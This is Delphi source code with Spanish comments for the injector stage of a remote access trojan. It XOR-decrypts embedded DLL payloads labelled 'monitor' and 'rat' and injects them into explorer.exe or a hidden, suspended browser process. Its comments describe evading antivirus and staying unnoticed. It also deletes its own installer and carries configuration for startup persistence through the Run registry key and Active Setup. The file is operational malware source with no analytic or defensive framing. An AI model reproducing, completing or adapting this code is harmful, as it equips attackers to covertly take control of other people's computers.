program jeringa;

uses
  ShellApi,
  Windows,
  minireg,
  SettingsDef,
  TlHelp32,
  afxCodeHook;

//{$R MyRes.res}  //comentar para crear el jeringa.exe para el builder
var
  MCompartida: THandle;       //Para escribir la configuracion a memoria
  MCompartida2: THandle;
  MCompartida3: THandle;
  ConfigCompartida : PConfigCompartida;
  ConfigLeida: PSettings;    //Para leer la configuracion
  Configuracion:   TSettings;
  StartInfo: TStartupInfo;
  ProcInfo:  TProcessInformation;

function cifrar(text: ansistring;i:integer): ansistring;
var
  iloop         :integer;
begin
  for iloop := 1 to length(text) do
    text[iloop] := chr(ord(text[iloop]) xor i);//funcion de cifrado simple para evadir antiviruses
  result := text;
end;
   
function strtoint(const s: string): integer;
var
  e: integer;
begin
  val(s, result, e);
end;

function lc(const S: string): string;
  const a=1;
var
  Max, CharNo : Cardinal;
  pResult : PChar;
begin
  Max := Length(S);
  SetLength(Result, Max);
  if Max <= 0 then exit;
  pResult := PChar(Result);
  CharNo := 0;
  repeat
    pResult[CharNo] := S[CharNo+a];
    if (S[CharNo+a]>= 'A') and (S[CharNo+a] <= 'Z') then
      pResult[CharNo] := char(Ord(S[CharNo+a]) + 32);
    Inc(CharNo);
  until(CharNo>= Max);
end;

function fileexists(const filename: string): boolean;
var
  filedata      :twin32finddata;
  hfile         :cardinal;
begin
  hfile := findfirstfile(pchar(filename), filedata);
  if (hfile <> invalid_handle_value) then
  begin
    result := true;
    windows.findclose(hfile);
  end
  else
    result := false;
end;

function WinDir: string;
var
  intLen:    integer;
  strBuffer: string;
begin
  SetLength(strBuffer, 1000);
  intLen := GetWindowsDirectory(PChar(strBuffer), 1000);
  Result := (Copy(strBuffer, 1, intLen));
  if Result[Length(Result) - 1] <> '\' then
    Result := Result + '\';
end;

  function GetProcessID(sProcName: string): integer;
  var
    hProcSnap: THandle;
    pe32:      TProcessEntry32;
  begin
    Result    := -1;
    hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
    if hProcSnap = INVALID_HANDLE_VALUE then
      Exit;
    pe32.dwSize := SizeOf(ProcessEntry32);
    if Process32First(hProcSnap, pe32) = True then
      while Process32Next(hProcSnap, pe32) = True do
        if pos(sProcName, lc(pe32.szExeFile)) > 0 then
          Result := pe32.th32ProcessID;
  end;
   function getBrowser: ansistring;
  var
    ts: ansistring;
  begin
    RegGetString(HKEY_CLASSES_ROOT, '\htmlfile\shell\open\command\', ts);
    ts     := Copy(ts, Pos('"', ts) + 1, Length(ts));
    ts     := Copy(ts, 1, Pos('"', ts) - 1);
    Result := ts;
    //  ShowMessage('El browser esta en: '+ts);
  end;


  function Inject(ResName: string; pid: dword):boolean;
  var
    ResourceLocation: HRSRC;
    ResourceSize:     longword;
    ResourceHandle:   THandle;
    ResourcePointer:  Pointer;
    handleWindow:     integer;
    Tempstr:          string;
  begin
     Result := true;
    //ResourceLocation := FindResource(HInstance, pchar('mi_dll'), RT_RCDATA);
    ResourceLocation := FindResource(SysInit.HInstance, PChar(ResName), 'DLL');
    //ShowMessage('es: '+IntTOStr(ResourceLocation));
    if ResourceLocation <> 0 then
    begin
      ResourceSize := SizeofResource(SysInit.HInstance, ResourceLocation);
      if ResourceSize <> 0 then
      begin
        ResourceHandle := LoadResource(SysInit.HInstance, ResourceLocation);
        if ResourceHandle <> 0 then
        begin
          ResourcePointer := LockResource(ResourceHandle);
          HandleWindow    := OpenProcess(PROCESS_ALL_ACCESS, False, pid);
          SetLength(tempstr, ResourceSize);
          Move(ResourcePointer^,tempstr[1], ResourceSize);//copiamos a tempstr y desciframos
          tempstr := cifrar(cifrar(tempstr, strtoint(configuracion.snumerocifrado2)), strtoint(configuracion.snumerocifrado));
          InjectLibrary(HandleWindow, @tempstr[1]);   //inyectamos despues de descifrar
        end
        else
          Result := false;
      end
      else
        Result := false;
    end
    else
      result := false;
  end;

 Procedure CompartirConfig();
 begin
  if ReadSettings(ConfigLeida) = True then   //Leemos la configuración
    begin
      Configuracion.sHosts                       := ConfigLeida^.sHosts;
      Configuracion.sID                          := ConfigLeida^.sID;
      Configuracion.bCopiarArchivo               := ConfigLeida^.bCopiarArchivo;
      Configuracion.sFileNameToCopy              := ConfigLeida^.sFileNameToCopy;
      Configuracion.sCopyTo                      := ConfigLeida^.sCopyTo;
      Configuracion.bCopiarConFechaAnterior      := ConfigLeida^.bCopiarConFechaAnterior;
      Configuracion.bMelt                        := ConfigLeida^.bMelt;
      Configuracion.bArranqueRun                 := ConfigLeida^.bArranqueRun;
      Configuracion.sRunRegKeyName               := ConfigLeida^.sRunRegKeyName;
      Configuracion.sPluginName                  := ConfigLeida^.sPluginName;
      Configuracion.sActiveSetupKeyName          := ConfigLeida^.sActiveSetupKeyName;
      Configuracion.bArranqueActiveSetup         := ConfigLeida^.bArranqueActiveSetup;
      Configuracion.snumerocifrado               := ConfigLeida^.snumerocifrado;
      Configuracion.snumerocifrado2              := ConfigLeida^.snumerocifrado2;
      end
      else
      begin
        exitprocess(0); //Para Debug
        {Configuracion.sHosts                      := 'localhost:80¬';
        Configuracion.sID                          := 'id';
        Configuracion.bCopiarArchivo               := false;
        Configuracion.sFileNameToCopy              := 'a.exe';
        Configuracion.sCopyTo                      := 'c:\';
        Configuracion.bCopiarConFechaAnterior      := false;
        Configuracion.bMelt                        := false;
        Configuracion.bArranqueRun                 := false;
        Configuracion.sRunRegKeyName               := 'rkey';
        Configuracion.sPluginName                  := 'a.dll';
        Configuracion.sActiveSetupKeyName          := 's';
        Configuracion.bArranqueActiveSetup         := false;
        Configuracion.snumerocifrado               := '0';
        Configuracion.snumerocifrado2              := '0';}

      end;

      MCompartida := CreateFileMapping( $FFFFFFFF,nil,PAGE_READWRITE,0,SizeOf(TSettings),'Config');
      if(MCompartida = 0) then exitprocess(0);
      ConfigCompartida:=MapViewOfFile(MCompartida,FILE_MAP_WRITE,0,0,0);
      {Escribimos datos en el fichero de memoria para que Monitor, coolserver.dll y conectador.exe}
      ConfigCompartida^.sHosts   := Configuracion.sHosts;
      ConfigCompartida^.sID     := Configuracion.sID;
      ConfigCompartida^.bCopiarArchivo := Configuracion.bCopiarArchivo;
      ConfigCompartida^.sFileNameToCopy :=  Configuracion.sFileNameToCopy;
      ConfigCompartida^.sCopyTo := Configuracion.sCopyTo;
      ConfigCompartida^.bCopiarConFechaAnterior := Configuracion.bCopiarConFechaAnterior;
      ConfigCompartida^.bMelt   := Configuracion.bMelt;
      ConfigCompartida^.bArranqueRun := Configuracion.bArranqueRun;
      ConfigCompartida^.sRunRegKeyName := Configuracion.sRunRegKeyName;
      ConfigCompartida^.bArranqueActiveSetup := Configuracion.bArranqueActiveSetup;
      ConfigCompartida^.sActiveSetupKeyName := Configuracion.sActiveSetupKeyName;
      ConfigCompartida^.sPluginName := Configuracion.sPluginName;
      ConfigCompartida^.sInyectadorFile := paramstr(0); //para informar a monitor y conectador.exe donde estoy

 end;


var
  pid: dword;
  i:integer;
begin
  if ParamStr(1) = '\melt' then
    begin
      //borro el archivo de instalación, reintento 5 veces por si las moscas :)
      for i := 1 to 5 do
      begin
        if not FileExists(ParamStr(2)) then
          break
        else
          DeleteFile(Pchar(ParamStr(2)));
        Sleep(10);
      end;
      //Otra opción: while not BorrarArchivo(ParamStr(2)) do Sleep(10);
      exitprocess(0);
    end; //Termina el Melt

   CompartirConfig();

   if (paramstr(1) = '') or (paramstr(1) = 's') then
  begin


    PID := GetProcessID('explorer.exe');
    if (PID = -1) then
      begin       //No existe explorer.exe, Muy raro....
        ShellExecute(0, 'open', PAnsiChar('explorer.exe'), PAnsiChar('explorer.exe'), nil, SW_SHOWNORMAL);
        sleep(30000);
        PID := GetProcessID('explorer.exe');
      end;

    if(paramstr(1) = 's') then  //el PC acaba de encenderse o han matado a explorer.exe cuando la opción active setup estaba activo
      sleep(30000); //Es mejor esperar unos 30 segundos porque explorer.exe acaba de iniciarse, quizas es demasiado pero mejor prevenir...
                   //Lo malo de esto es que al esperar salimos listados en la lista de procesos, en el futuro habria que agregar un pequeño rootkit

    if (PID <> -1) then
    if not Inject('monitor', pid) then
    begin //como no está activada la persistencia yo me tengo que encargar de inyectar el rat
      ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
      StartInfo.cb      := SizeOf(TStartupInfo);
      startinfo.dwFlags := STARTF_USESHOWWINDOW; // use wShowWindow
      startinfo.wShowWindow := SW_HIDE;
      CreateProcess(pchar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      sleep(500); //le dejamos un rato...
      Inject('rat', procInfo.dwProcessId);    //inyectamos el servidor en memoria
    end;

    while true do  //Esperamos a que nos manden cerrar
    begin
      MCompartida2:=OpenFileMapping(FILE_MAP_READ,False,'Config');
      ConfigCompartida:=MapViewOfFile(Mcompartida2,FILE_MAP_READ,0,0,0);  //Leemos
       //showmessage(ConfigCompartida.sPluginName);
      if ConfigCompartida.bcerrar then exitprocess(0);//Conectador.dll nos manda cerrarnos
      sleep(500);
    end; //Esperamos hasta que conectador.dll nos avise de que ha leido la configuración

  end
  else if ParamCount = 2 then
  begin

     MCompartida2:=OpenFileMapping(FILE_MAP_READ,False,'Config');
     if MCompartida2=0 then
     begin
       CompartirConfig(); //tenemos que compartirla otra vez...
       if (Paramstr(2) = 'ultima') then
       begin
          PID := GetProcessID('explorer.exe');
          sleep(4000);
          if(PID <> -1) then
            Inject('RAT', PID);//ha fallado la inyecion mas de tres veces o nos han cerrado mas de tres veces asi que como último recurso intentamos inyectarlo en explorer.exe para pasar desapercibidos


       end
       else
       begin
          Inject('RAT', StrToInt(ParamStr(2)));    //inyectamos el servidor en memoria
       end;
       
     while true do
      begin
        MCompartida3:=OpenFileMapping(FILE_MAP_READ,False,'Config');
        ConfigCompartida:=MapViewOfFile(Mcompartida3,FILE_MAP_READ,0,0,0);  //Leemos
        if ConfigCompartida.bcerrar then exitprocess(0);//Conectador.dll nos manda cerrarnos
        sleep(500);
      end;

     end
     else
       Inject('RAT', StrToInt(ParamStr(2))); 


      CloseHandle(MCompartida2);
  end;

end.
